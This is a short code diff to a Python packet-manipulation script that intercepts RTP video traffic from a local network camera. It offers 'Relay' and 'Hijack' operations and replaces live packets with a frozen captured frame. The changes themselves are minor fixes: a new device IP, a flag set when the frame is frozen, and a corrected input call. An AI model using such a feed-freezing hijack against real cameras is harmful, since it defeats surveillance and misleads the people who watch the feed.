@@ -6,7 +6,7 @@ conf.ipv6_enabled = False
 
 cameraip = "192.168.1.15"
 
-deviceip = "192.168.1.9"
+deviceip = "192.168.1.3"
 
 hacking = False
 forwarding = True
@@ -28,6 +28,7 @@ while True:
                     pkt["UDP"].payload = RTP(pkt["Raw"].load)
                     if not freeze:
                         freezePkt = pkt
+                        freeze = True
                     
                     ## Overwrite of the Packet with the freeze version.
 
@@ -61,7 +62,7 @@ while True:
         ans = ""
         exit = False
         while not exit:
-            ans = Input("Select operation: 0 Nothing, 1 Relay, 2 Hijack, 3 Stop/Resume Forwarding, 4 Exit")
+            ans = input("Select operation: 0 Nothing, 1 Relay, 2 Hijack, 3 Stop/Resume Forwarding, 4 Exit")
             if ans=="0":
                 exit = True
             if ans=="4":
